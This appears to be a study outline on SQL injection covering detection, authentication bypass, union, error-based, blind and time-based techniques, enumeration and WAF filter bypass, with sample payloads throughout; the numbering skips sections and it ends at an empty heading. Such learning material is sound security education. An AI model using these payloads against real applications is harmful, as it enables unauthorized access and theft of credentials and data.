# SQL Injection – Complete Topic List

## 1. SQL Injection Fundamentals

You can’t exploit SQLi if you don’t understand how SQL queries work.

Topics:

* How databases work (MySQL, PostgreSQL, MSSQL)
* Basic SQL queries (`SELECT`, `INSERT`, `UPDATE`, `DELETE`)
* How web apps build SQL queries
* What SQL Injection actually is
* How user input breaks queries

Example vulnerable query:

```
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```

Payload:

```
' OR 1=1 --
```

Result → authentication bypass.

# 2. Detecting SQL Injection

Before exploitation you must **confirm SQLi exists**.

Methods:

* Error-based detection
* Boolean-based testing
* Time delay testing
* Using `'` to break queries
* Using comments `--` `#` `/* */`

Things to test:

```
'
"
'
--
' OR 1=1--
```

# 3. Authentication Bypass

One of the **most common SQLi bugs**.

Example login bypass:

```
admin' --
```

or

```
' OR '1'='1
```

Concepts:

* comment truncation
* bypassing password checks

---

# 4. Union-Based SQL Injection

Very important for **data extraction**.

Concepts:

* `UNION SELECT`
* matching column counts
* identifying visible columns
* extracting database data

Example:

```
' UNION SELECT null,null,null --
```

Then extract data:

```
' UNION SELECT username,password FROM users --
```

---

# 5. Error-Based SQL Injection

Some databases return **useful error messages**.

You exploit errors to reveal data.

Examples:

* MySQL `extractvalue()`
* `updatexml()`

Example payload:

```
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
```

---

# 6. Blind SQL Injection

When the server **does NOT show results**.

You extract data by observing **true/false behavior**.

Example:

```
' AND 1=1 --
' AND 1=2 --
```

Difference in response = SQLi confirmed.

---

# 7. Boolean-Based Blind SQLi

Extract data **character by character**.

Example:

```
' AND SUBSTRING(database(),1,1)='a' --
```

You brute force database name letter by letter.

---

# 8. Time-Based Blind SQLi

Used when **no output difference exists**.

You cause **delays**.

Example:

```
' AND SLEEP(5) --
```

or

```
' IF(1=1,SLEEP(5),0) --
```

Server delay = injection confirmed.

---

# 9. Database Enumeration

Once SQLi works, you enumerate everything.

Find:

* database names
* tables
* columns
* users
* passwords

Examples:

Find databases:

```
SELECT schema_name FROM information_schema.schemata
```

Find tables:

```
SELECT table_name FROM information_schema.tables
```

# 11. SQL Injection in Different Contexts

SQLi isn't just in login forms.

Places:

* search boxes
* filters
* URL parameters
* cookies
* headers
* JSON APIs
* GraphQL queries

Example:

```
GET /product?id=1
```

Payload:

```
?id=1' UNION SELECT ...
```

# 12. Second Order SQL Injection

Advanced but real.

Injection happens **later** after data is stored.

Example:

1. Malicious username stored
2. Later used in query
3. SQLi triggers

---

# 13. SQL Injection WAF Bypass

Real targets often have WAF.

You must bypass filters.

Examples:

Encoding:

```
%27
```

Inline comments:

```
UN/**/ION
```

Case bypass:

```
UnIoN SeLeCt
```

# 17. Database Specific SQLi
